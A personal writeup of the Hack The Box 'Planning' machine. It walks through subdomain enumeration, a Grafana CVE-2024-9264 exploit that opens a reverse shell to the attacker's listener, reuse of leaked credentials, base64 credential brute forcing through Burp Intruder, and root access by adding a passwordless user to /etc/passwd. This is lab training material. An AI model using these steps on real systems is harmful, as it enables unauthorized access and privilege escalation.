---
title: HTB Planning - Writeup
date: 2025-05-22 20:00:00 +0330
categories: [Writeup]
tags: []
description: My writeup of Planning from Hack The Box 

---

![](assets/img/planning_info.png)

## - **Recon & Enum**
As always, we start with an Nmap scan:
```shell
$ nmap -sC -sV -oN planning_nmap --min-rate=100 -p- 10.10.11.68
```

```
Nmap scan report for 10.10.11.68
Host is up (0.27s latency).
Not shown: 65468 closed tcp ports (reset), 65 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Navigated to the site and there wasn't anything that interesting and Brute forcing directories and sub domains seemed to be going no where. After browsing for a bit, I noticed an spanish comment in the home page, so I wondered and started the brute forcing with spanish wordlists and there it was, `grafana.planning.htb`.

![](assets/img/planning_comment.png)

```shell
$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-spanish.txt -u http://planning.htb --append-domain
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://planning.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-spanish.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: ALFONSO DE JESUS VELEZ RIVAS.planning.htb Status: 400 [Size: 166]
Found: CASA EDITORIAL EL TIEMPO S A.planning.htb Status: 400 [Size: 166]
Found: ENTIDAD ELLEN MUNCH SL - CIF B85206431 - NOMBRE MUNCH ELEONORE MARGARETE ANTOINE - NIF X1107422H.planning.htb Status: 400 [Size: 166]
Found: ENTIDAD MARCO SPINELLI SA - CIF A78310612 - NOMBRE ZARAGOZA GAMERO GEMMA - NIF 07227397S.planning.htb Status: 400 [Size: 166]
Found: ENTIDAD TELEFONICA COMPRAS ELECTRONICAS SL - CIF B85284594 - NOMBRE MOLINA TORRES RAUL - NIF 04570270D.planning.htb Status: 400 [Size: 166]
Found: ENTIDAD GEMAUZA.planning.htb Status: 400 [Size: 166]
Found: FONDO NACIONAL DE AHORRO.planning.htb Status: 400 [Size: 166]
Found: grafana.planning.htb Status: 302 [Size: 29] [--> /login]
```
## - **Foothold**

After looking up Grafana, there was this [exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit) which looked promising. HTB provided a username and a password `admin / 0D5oT70Fq13EvB5r`.

```shell
$ python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip *.*.*.* --reverse-port 9070
```

```
$ nc -nvlp 9070
listening on [any] 9070 ...
connect to [*.*.*.*] from (UNKNOWN) [10.10.11.68] 43084
sh: 0: can't access tty; job control turned off
# python3 -c 'import pty;pty.spawn("/bin/bash")'
sh: 1: python3: not found
# python -v
sh: 2: python: not found
# whoami
root
```

It looks like we are in a container. Ran linpeas and found two possible breakouts, abusing container capabilities and `/proc` mount, Then I discovered `/proc` is read only. It was after revisiting the linpeas output that I saw the environment variables and there they were,  
`GF_SECURITY_ADMIN_PASSWORD=Rio----------ANT!`  
`GF_SECURITY_ADMIN_USER=enzo`

## - **User**
```
enzo@planning:~$ cat user.txt    
1595a------------------ea2d0cb32
```
We cannot run `sudo` as user enzo, so I started looking around and found something inside `/opt/crontabs/crontab.db`, a password `P4ssw0rdS0pRi0T3c`.
```
enzo@planning:/opt/crontabs$ cat crontab.db 

{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

## - **Root**
we have some service running on port `8000`.
```
enzo@planning:~$ ss -tuln
Netid                State                 Recv-Q                Send-Q                               Local Address:Port                                  Peer Address:Port                Process                
udp                  UNCONN                0                     0                                       127.0.0.54:53                                         0.0.0.0:*                                          
udp                  UNCONN                0                     0                                    127.0.0.53%lo:53                                         0.0.0.0:*                                          
tcp                  LISTEN                0                     511                                      127.0.0.1:8000                                       0.0.0.0:*                                          
tcp                  LISTEN                0                     4096                                     127.0.0.1:45875                                      0.0.0.0:*                                          
tcp                  LISTEN                0                     4096                                 127.0.0.53%lo:53                                         0.0.0.0:*                                          
tcp                  LISTEN                0                     4096                                    127.0.0.54:53                                         0.0.0.0:*                                          
tcp                  LISTEN                0                     4096                                     127.0.0.1:3000                                       0.0.0.0:*                                          
tcp                  LISTEN                0                     511                                        0.0.0.0:80                                         0.0.0.0:*                                          
tcp                  LISTEN                0                     70                                       127.0.0.1:33060                                      0.0.0.0:*                                          
tcp                  LISTEN                0                     151                                      127.0.0.1:3306                                       0.0.0.0:*                                          
tcp                  LISTEN                0                     4096                                             *:22                                               *:*                                          
```

so we forward it on our localhost.
```shell
$ ssh enzo@planning.htb -L 8000:localhost:8000
```

![](assets/img/planning_local.png)
![](assets/img/planning_burp.png)
I used `top-usernames-shortlist.txt` from seclists and added enzo to it, and a password file with all the passwords we have so far. The login form uses the following structure `<username>:<password>` and then base64 encodes it, so I wrote a python script to provide me the structure in a txt file so then we can feed it to Burp intruder.

```python
#!/bin/python3
import base64

with open('usernames.txt') as f:
        usr=f.read().split('\n')[:-1]
with open('passwords.txt') as f:
        pss=f.read().split('\n')[:-1]

for i in usr:
        for j in pss:
                tmp=base64.b64encode(bytes(f"{i}:{j}",'utf-8'))
                with open("combine.txt","a") as f:
                        f.write(tmp.decode('utf-8')+'\n')
                        
```
![](assets/img/planning_intruder_combine.png)

And here we go, got the combination!

![](assets/img/planning_intruder.png)

```
$ echo cm9vdDpQNHNzdzByZFMwcFJpMFQzYw | base64 -d
root:P4ssw0rdS0pRi0T3c
```

![](assets/img/planning_crontabui.png)

After logging in, we see a crontab ui which runs commands and scripts as superuser. I made `/etc/passwd` writable and added the following line to it.
```
my_root::0:0:root:/root:/bin/bash
```
And now we can switch user to `my_root` and get root.txt.
```
enzo@planning:~$ su my_root
my_root@planning:/home/enzo# cd
my_root@planning:~# ls
root.txt  scripts
my_root@planning:~# cat root.txt
891956a------------------815b733
```

Also don't forget to return `/etc/passwd` permissions to default and remove the `my_root` user from it.
```
my_root@planning:~# chmod 644 /etc/passwd
my_root@planning:~# ls -la /etc/passwd
-rw-r--r-- 1 my_root root 2031 Jul 21 12:22 /etc/passwd
```


![](assets/img/planning_congrats.png)

Done and Dusted!  
and thanks for reading.